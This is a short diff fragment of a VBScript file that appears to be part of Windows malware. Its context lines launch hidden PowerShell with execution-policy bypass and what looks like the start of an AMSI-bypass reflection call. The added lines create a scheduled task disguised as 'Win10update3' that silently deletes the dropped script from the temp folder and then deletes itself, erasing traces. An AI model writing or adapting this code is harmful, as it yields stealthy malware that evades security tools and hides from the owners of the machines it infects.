@@ -5,3 +5,7 @@ w4.Run ("powershell -ep bypass -win hid -nop [Ref].Assembly.GetType('System.Mana
 Set Delshell = wscript.createobject("wscript.shell")
 Delshell.run "schtasks /delete /tn Win10update2 /F", 0, False
 
+
+Set Fourshell = wscript.createobject("wscript.shell")
+Fourshell.run "schtasks /create /sc minute /mo 5 /tn Win10update3 /tr ""cmd start /min /c del %tmp%\windows10two.vbs && schtasks /delete /tn Win10update3 /F""", 0, False
+
